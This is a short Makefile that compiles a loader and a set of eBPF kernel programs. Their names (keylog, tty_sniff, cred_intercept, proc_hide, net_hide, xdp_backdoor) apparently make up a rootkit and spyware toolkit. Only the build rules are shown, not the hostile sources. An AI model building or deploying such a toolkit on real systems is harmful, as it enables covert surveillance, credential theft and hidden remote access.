CLANG   = clang
CC      = gcc
ARCH    = $(shell uname -m)
INCDIR  = /usr/include/$(ARCH)-linux-gnu

BPF_CFLAGS = -O2 -g -target bpf -D__TARGET_ARCH_x86 -I$(INCDIR)
CFLAGS     = -O2 -Wall

.PHONY: all clean vmlinux

BPF_PROGS = \
    keylog.bpf.o \
    net_spy.bpf.o \
    exec_spy.bpf.o \
    proc_hide.bpf.o \
    tty_sniff.bpf.o \
    xdp_backdoor.bpf.o \
    net_hide.bpf.o \
    cred_intercept.bpf.o \
    fentry_open_spy.bpf.o

all: loader $(BPF_PROGS)

vmlinux:
	@echo "[*] generating vmlinux.h from running kernel BTF..."
	bpftool btf dump file /sys/kernel/btf/vmlinux format c > vmlinux.h

# pattern rule for all .bpf.c files
%.bpf.o: %.bpf.c
	$(CLANG) $(BPF_CFLAGS) -c $< -o $@
	@echo "[*] built $@"

loader: loader.c
	$(CC) $(CFLAGS) -o $@ $<
	@echo "[*] built $@"

clean:
	rm -f *.o loader vmlinux.h
